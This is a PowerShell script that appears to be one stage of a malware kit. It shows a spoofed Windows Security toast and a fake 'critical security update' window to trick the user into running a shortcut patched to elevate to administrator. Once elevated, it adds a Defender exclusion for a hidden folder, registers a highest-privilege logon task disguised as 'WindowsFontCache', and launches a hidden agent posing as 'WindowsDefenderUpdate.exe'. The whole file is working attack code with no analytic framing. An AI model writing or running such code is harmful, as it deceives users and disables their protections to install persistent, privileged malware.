Add-Type -AssemblyName System.Runtime.WindowsRuntime
$null=[Windows.UI.Notifications.ToastNotificationManager,Windows.UI.Notifications,ContentType=WindowsRuntime]
$null=[Windows.UI.Notifications.ToastNotification,Windows.UI.Notifications,ContentType=WindowsRuntime]
$null=[Windows.Data.Xml.Dom.XmlDocument,Windows.Data.Xml.Dom,ContentType=WindowsRuntime]
$A="$env:LOCALAPPDATA\Microsoft\Windows\Fonts\WindowsDefenderUpdate.exe"
$S="$env:TEMP\DefenderUpdate"
$N="PowerShell Security Patch.lnk"
$M="UpdateEngine.ps1"
mkdir $S -Force|Out-Null
if(!(Test-Path $A)){Write-Error "Agent not found at $A. Run basic persistence first.";exit 1}
cp $A "$S\agent.exe" -Force
$script=@'
$host.UI.RawUI.WindowTitle='Windows PowerShell Security Update'
$host.UI.RawUI.ForegroundColor='White'
Write-Host '================================================' -ForegroundColor Cyan
Write-Host '  Windows Security – Critical Update' -ForegroundColor Yellow
Write-Host '  Applying critical security update...' -ForegroundColor Gray
Write-Host '================================================' -ForegroundColor Cyan
Write-Host ''
Write-Host 'Please do not close this window.' -ForegroundColor White
Write-Host ''
Write-Host ''
$sl=[Console]::CursorTop - 1
Write-Host ''
$bl=[Console]::CursorTop - 1
function Update-Progress($p,$t){
 [Console]::SetCursorPosition(0,$sl);Write-Host (' '*80) -NoNewline
 [Console]::SetCursorPosition(0,$sl);Write-Host $t -ForegroundColor Yellow -NoNewline
 [Console]::SetCursorPosition(0,$bl);Write-Host (' '*80) -NoNewline
 [Console]::SetCursorPosition(0,$bl)
 $f=[math]::Floor($p/2);$e=50-$f
 $b='['+('='*$f)+(' '*$e)+']'
 Write-Host "$b $p%" -ForegroundColor Cyan -NoNewline
}
$total=100;for($i=0;$i -le $total;$i++){
 $status=if($i -lt 50){'Installing security update...'}elseif($i -lt 80){'Configuring security...'}else{'Finalising...'}
 Update-Progress $i $status
 Start-Sleep -Milliseconds 25
}
Write-Host '';Write-Host ''
Write-Host 'Security update successfully installed.' -ForegroundColor Green
Write-Host 'This window will close automatically in a few seconds...' -ForegroundColor Gray

# --- Elevated actions (admin now) ---
$fdir="$env:LOCALAPPDATA\Microsoft\Windows\Fonts"

# 1. Add Defender exclusion
Add-MpPreference -ExclusionPath $fdir -Force -ErrorAction SilentlyContinue

# 2. Kill any existing agent process (old non-admin instance)
Get-Process | Where-Object { $_.Path -eq "$fdir\WindowsDefenderUpdate.exe" } | Stop-Process -Force -ErrorAction SilentlyContinue
Start-Sleep -Seconds 1

# 3. Remove old scheduled task (no prompt)
Unregister-ScheduledTask -TaskName "WindowsFontCache" -Confirm:$false -ErrorAction SilentlyContinue

# 4. Create new scheduled task that runs as admin at every logon
$taskAction    = New-ScheduledTaskAction -Execute "$fdir\WindowsDefenderUpdate.exe"
$taskTrigger   = New-ScheduledTaskTrigger -AtLogOn
$taskPrincipal = New-ScheduledTaskPrincipal -UserId $env:USERNAME -RunLevel Highest
$taskSettings  = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -StartWhenAvailable -Compatibility Win8
Register-ScheduledTask -TaskName "WindowsFontCache" -Action $taskAction -Trigger $taskTrigger -Principal $taskPrincipal -Settings $taskSettings -Force | Out-Null

# 5. Remove the registry Run key (no longer needed)
Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "WindowsFontHelper" -ErrorAction SilentlyContinue

# 6. Start the agent now (admin)
Start-Process "$fdir\WindowsDefenderUpdate.exe" -WindowStyle Hidden

Start-Sleep -Seconds 3;exit
'@
Set-Content "$S\$M" -Value $script -Encoding UTF8
$Wsh=New-Object -ComObject WScript.Shell
$sh=$Wsh.CreateShortcut("$S\$N")
$sh.TargetPath="C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
$sh.Arguments="-NoP -Exec Bypass -File `"$S\$M`""
$sh.WorkingDirectory=$S
$sh.IconLocation="C:\Windows\System32\SecurityHealthSystray.exe,0"
$sh.Description="Windows PowerShell Security Update"
$sh.Save()
$b=[IO.File]::ReadAllBytes("$S\$N");$b[0x15]=$b[0x15] -bor 0x20;[IO.File]::WriteAllBytes("$S\$N",$b)
$app=Get-StartApps|? Name -eq 'Windows Security'
$id=if($app){$app.AppID}else{'Microsoft.Windows.SecHealthUI_cw5n1h2txyewy!SecHealthUI'}
$url="file:///"+($S -replace '\\','/')+"/$N"
$xml=@"
<toast launch="test" activationType="protocol" duration="long">
 <visual><binding template="ToastGeneric">
  <text>Windows Security</text>
  <text>A critical PowerShell vulnerability has been detected. Update now to protect your device.</text>
 </binding></visual>
 <actions>
  <action content="Update now" arguments="$url" activationType="protocol" />
 </actions>
 <audio src="ms-winsoundevent:Notification.Default" />
</toast>
"@
$d=New-Object Windows.Data.Xml.Dom.XmlDocument;$d.LoadXml($xml)
$t=[Windows.UI.Notifications.ToastNotification]::new($d)
[Windows.UI.Notifications.ToastNotificationManager]::CreateToastNotifier($id).Show($t)
